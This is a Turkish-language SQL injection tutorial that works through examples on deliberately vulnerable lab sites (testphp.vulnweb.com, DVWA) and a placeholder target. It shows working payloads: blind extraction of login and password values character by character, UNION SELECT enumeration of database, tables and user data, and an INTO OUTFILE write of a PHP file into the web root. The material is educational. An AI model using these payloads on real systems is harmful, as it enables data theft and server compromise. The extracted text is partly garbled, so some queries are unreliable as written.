## SIBERVATAN

# SQL INJECTION

Emre Do ̆gan

emreefedogan@gmail.com

Mart 2021


**SQL - SQL Injection Nedir?**

SQL Injectionı anlamak için öncelikle SQL’in ne oldu ̆gunu ve nasıl çalı ̧stı ̆gını bilmek gerek-
mektedir. SQL(Structured Query Language), yapılandırılmı ̧s sorgulama dilidir.SQL, veri depo-
lamak, de ̆gi ̧stirmek ve i ̧slemek için kullanılan veritabanı yönetim sistemidir. Bir programlama
dili de ̆gildir. SQL tutoriallarını inceleyerek daha fazla bilgi edinebilirsiniz^1.

**Nedir bu SQL Injection?**

SQL’in ne oldu ̆guna de ̆gindi ̆gimize göre SQL Injection konusuna de ̆ginelim. SQL Injection,
veritabanlarını hedef alan siber saldırı çe ̧sididir. Saldırganların SQL sorgularının çalı ̧stıra-
bilmesidir. Sql sorgularının çalı ̧stırılması sonucunda güvenlik açı ̆gından yararlanarak verita-
banına ula ̧sılır. Sql injection sayesinde web sitesindeki kullanıcı bilgileri edinilebilir. gizlen-
mi ̧s bilgiler ve verilere ula ̧sılabilir. Mevcut olan verileri de ̆gi ̧stirebilir.Yetki yükseltilebilir veya
tamamen veritabanı silinebilir. Genel i ̧sleyi ̧s mantı ̆gı Figure 1’de görülmektedir..

```
Figure 1: Sql Injection Akis Diyagrami
```
**SQL injection içeren siteleri nasıl tespit ederiz?**

̇Ilk olarak yapaca ̆gımız sayfadaki kullanıcı girdisini aramak olmalıdır. Genelde html say-

falarında kullanıcının girdilerini gönderirken POST methodu kullanılmaktadır. Sayfanın
adresinde parametreler göremeyiz. Bu durumla kar ̧sıla ̧stı ̆gımızda kaynak kodunu inceleyerek
hangi parametlerin gönderildi ̆gini bulabiliriz.

(^1) https://www.w3schools.com/sql/


**Basic SQL Injection**

Sql injection, hedef sitenin veritabanında sql sorgularını çalı ̧stırarak login bypass yapmamıza
ve verileri elde edebilece ̆gimiz sorgular atabilece ̆gimizi biliyoruz. Bir uygulama yapalım:
Hedef sitemiz : [http://testphp.vulnweb.com](http://testphp.vulnweb.com) Sql injection saldırılarımızı bu sitede deneyelim.
[http://testphp.vulnweb.com/listproducts.php?cat=1](http://testphp.vulnweb.com/listproducts.php?cat=1) adresine girdi ̆gimizde :

```
Figure 2: http://testphp.vulnweb.com/listproducts.php?cat=
```
1 id ye ait bir sayfa önümüze geliyor. Peki bunu 2 , 3 yaptı ̆gımızda ne olacak muhtemelen
sayfada bazı de ̆gi ̧siklikler meydana gelecektir.

```
Figure 3: http://testphp.vulnweb.com/listproducts.php?cat=
```

```
Figure 4: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=
```
Php kodlarında sql injection ̧su ̧sekilde i ̧sler sorgu parametresi altında bu kod çalı ̧sır
“SELECT * FROM tablonunadı WHERE id = _c at_ “
Bu php koduna baktı ̆gımızda gördü ̆gümüz ̧sey ̧sudur; Tablomuzun adı sibervatan olsun
diyelim. ̇Ilk önce Sibervatan tablosuna git. Idsi verilen kısmı getir. Sql sorgu mantı ̆gının
php de nasıl çalı ̧sma gösterdi ̆gini anlattık. ̧Simdi gelelim buradaki ‘’cat” de ̆gi ̧skenine farklı
numaralar girdi ̆gimizde, farklı sonuçlar önümüze çıkmaktadır. Bu giri ̧si atlatmak için ‘’or” ,
‘’and’ mantıksal ifadelerini tercih etmekteyiz.


```
Figure 5: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=
```
Olu ̧san sorgularımız php kodunda ̧su ̧sekildedir.
“ SELECT * FROM tablonunadı WHERE id = _c at_ “ _and_ 1 = 1
“ SELECT * FROM tablonunadı WHERE id = _c at_ “ _and_ 1 = 0
Veritabanında 1=1 kısmı TRUE olarak bize dönerken 1=0 kısmı bize FALSE dönü ̧sü yap-
maktadır.
E ̆ger yaptı ̆gımız iki sorgudan TRUE ve FALSE olanları farklı dönü ̧sler verirse sql injection
zafiyeti mevcuttur diyebiliriz.
Yaptı ̆gımız sql injection saldırılarında, sql syntaxi önemlidir. Hata alıp hangi sql yapısını
çalı ̧stı ̆gını ö ̆grenebiliriz bunu da tek tırnak ile yapıyoruz.


```
Figure 6: http://testphp.vulnweb.com/listproducts.php?cat=2’
```
```
Veritabanı sisteminin bu hata ile mysql oldu ̆gu net olarak anla ̧sılmaktadır.
```
**Blind SQL Injection**

Blind sql injection, sql injection saldırılarına göre daha farklıdır. Çünkü veritabanı bilgisi
gerektirmektedir. Veritabanında TRUE FALSE yaparak bir yol bulunmaya çalı ̧sılır.
Blind Sql Injection senaryosu:
1-) [http://www.hedefwebsite.com/activity.php?id=1121](http://www.hedefwebsite.com/activity.php?id=1121) and 1=1 yapmayı deneyelim.
Kar ̧sımıza normal sayfa gelmektedir.
2-) [http://www.hedefwebsite.com/activity.php?id=1121](http://www.hedefwebsite.com/activity.php?id=1121) and 1=2 yapmayı deneyelim..
Sayfa bizi 404 e yönlendirmektedir. Bir de ̆gi ̧sim meydana geldi. E ̆ger and 1=1 yaptı ̆gımızda
da 404 e yönlendirseydi bir ̧sey olmadı ̆gını dü ̧sünürdük fakat and 1=1 de normalken yanlı ̧s
durumunda (and 1=2) sayfa da yanlı ̧s oluyor. Yani blind sql oldu ̆gunu kanıtlıyor. Hata
sayesinde mysql oldu ̆gunu ö ̆grendik.
3-) ̧Simdi mysql versiyonunu bulalım. [http://www.hedefwebsite.com/activity.php?id=](http://www.hedefwebsite.com/activity.php?id=)
and substring(version(),1,1)=4 sayfa bize true olarak dönü ̧s sa ̆gladı. E ̆ger 4 yerine 5 yazmı ̧s
olsaydık versiyonu 5 olmadı ̆gı için 404 verecekti. Versiyonunu bu sayede Versiyon 4 olarak
bulduk.


4-)Bu sitede select seçme komutunu kabul ettirebilip ettiremedi ̆gimize bakalım.
[http://www..hedefwebsite.com/activity.php?id=1121+and+(select](http://www..hedefwebsite.com/activity.php?id=1121+and+(select) 1)=1 sayfa yine bize
true olarak döndü o halde devam etmeliyiz. ̧Simdi users tablosuna blind komutu ile tabloyu
test edelim. [http://www.hedefwebsite.com/activity.php?id=1121](http://www.hedefwebsite.com/activity.php?id=1121) and (select 1 from tablo
limit 0,1)=
5-) ̧simdi tablo adına tablo dedik 404 e yönlendirecektir, çünkü öyle bir tablo adı bulunma-
makta. Tablo kısmını users yapıp deneyebiliriz. [http://www.hedefwebsite.com/activity.php?id=](http://www.hedefwebsite.com/activity.php?id=)
and (select 1 from users limit 0,1)=
tablo adına users verince bize true olarak sayfa döndü. O halde devam etmeliyiz. ̧Simdi
users’e ait kolonları test edelim. [http://www.hedefwebsite.com/activity.php?id=1121](http://www.hedefwebsite.com/activity.php?id=1121) and (se-
lect substring(concat(1,column),1,1) from users limit 0,1)=1 boyle girdi ̆gimizde yine bizi 404 e
atacaktır bu yüzden column kısmını de ̆gi ̧stirmeliyiz. [http://www.hedefwebsite.com/activity.php?id=](http://www.hedefwebsite.com/activity.php?id=)
and (select substring(concat(1,login),1,1) from users limit 0,1)=1 login yaptı ̆gımızda sayfa bize
true dönecektir. Login yerine password yazarak 1.harf, 2.harf, 3.harf ̧seklinde login ve pass-
word çekmi ̧s olduk. [http://www.hedefwebsite.com/activity.php?id=1121](http://www.hedefwebsite.com/activity.php?id=1121) and ascii(substring((SELECT
concat(column1,0x3a,column2) from tablo limit 0,1),1,1))>95 Verileri birle ̧stirmek için assci
karakterlerinden yararlanılır. 97 bunu temsil ediyor. [http://www.asciitable.com/](http://www.asciitable.com/) adresinden
bu karakterlere detaylı bakılabilir. Ayrıca Blind Sql Injection için kullanılan kodlara ula ̧smak
için google’ye SQL Injection Cheat Sheet yazarak detaylı inceleyebilirsiniz.
[http://www.hedefwebsite.com/activity.php?id=1121](http://www.hedefwebsite.com/activity.php?id=1121) and ascii(substring((SELECT con-
cat(login,0x3a,password) from users limit 0,1),1,1))>96 Sayfa düzgün gelmekte fakat sayfanın
false dönece ̆gi yeri bulmak önemlidir.
Bu ascii kodlarını girerek sayfa hangi de ̆gerde false dönerse o de ̆gere kar ̧sılık olan harf
bizim ilk harfimiz olacaktır.
[http://www.hedefwebsite.comactivity.php?id=1121](http://www.hedefwebsite.comactivity.php?id=1121) and ascii(substring((SELECT con-
cat(login,0x3a,password) from users limit 0,1),1,1))>
Diyelim ki 96 yazdı ̆gımızda sayfa true döndü ancak 97 yazdı ̆gımızsa sayfa false döndü o
halde 97 de ̆gerine ascii tablosunda kar ̧sılık gelen harf bizim ilk harfimiz oldu. 97 ascii koduna
kar ̧sılık gelen harf a dır. O halde ilk harfimiz a.
admin olabilece ̆gini tahmin edelim diyelim. ̧Simdi 2. harfi denemek için 1,1 kısmını
de ̆gi ̧stiriyoruz. ve 2,1 yapıyoruz.
[http://www.hedefwebsite/activity.php?id=1121](http://www.hedefwebsite/activity.php?id=1121) and
ascii(substring((SELECT concat(login,0x3a,password) from users limit 0,1),2,1))>99 Bu
̧sekilde deneyerek buluyoruz.
Yani, Sql blind injection deneme-yanılma yöntemi ile sitenin verdi ̆gi tepkiler üzerinde


göz önüne alınarak veritabanı bilgilerini görüntülemek ̧seklinde özetlenebilmektedir.

**SQL INJECTION DVWA (LOW LEVEL) ÇÖZÜMLER ̇I**

Damn Vulnerable Web Application (DVWA),Web uygulama güvenli ̆gi ile u ̆gra ̧san kendini
geli ̧stirmek isteyen pentestler veya güvenlik açıklarıyla u ̆gra ̧san ki ̧siler için php ile geli ̧stir-
ilmi ̧s belirli zafiyetler barındıran sistemdir. Biz DVWA sisteminde SQL Injection zafiyetini
inceleyece ̆giz. Öncelikle 1 or ‘1’=’1 denemesiyle Sql injection tespitini yapmaktayız ve tek
tırnak ile yapıldı ̆gını görmekteyiz.

```
Figure 7: 1 or ‘1’=’
```
1 id ye ait bir sayfa önümüze geliyor. Peki bunu 2 , 3 yaptı ̆gımızda ne olacak muhtemelen
sayfada bazı de ̆gi ̧siklikler meydana gelecektir.


- Figure 8: Veritabanı Kolon Sayısı Tespiti 1 UNION SELECT 1,


**Figure 9:** Veritabanı Versiyon Bilgisi 1 UNION SELECT version(),2 sorgusu ile versiyon bilgisini elde
ediyoruz.

**Figure 10:** Veritabanının ̇Isim Bilgisi 1 UNION SELECT database(),2 sorgusu ile database ismine
ula ̧smaktayız


**Figure 11:** Tabloların Kolonlarının Belirlenmesi 1(UNION SELECT
column _name_ , 2 _F ROMi n f or mat i onschema_. _col umnsW H E RE t abl eschema_ =′
_d v w a_ ′ _AN D t abl ename_ =′ _user s_ ′)


```
Figure 12: Tablolardaki Verileri Ekrana Yazdırma 1’ UNION SELECT
first name , l astnameF ROMuser s
```
**Figure 13:** SORGU ̇ILE DOSYA EKLEME 1 UNION SELECT ‘<?php echo "emre efe";’,’?>’ INTO OUTFILE
‘/var/www/html/dvwa/emreefe.php’


**Figure 14:** Sorgu sonucunda dosyamızı da ba ̧sarıyla eklemi ̧s olduk. E ̆ger ki dosya ekleme saldırısını
yapmaya çalı ̧stı ̆gında okuma ve yazma yetkiniz yok gibi bir hata alıyorsanız.Linux sistemininizde dvwa
nın bulundu ̆gu yere okuma ve yazma izni vererek bu saldırı metodunu deneyebilirsiniz.


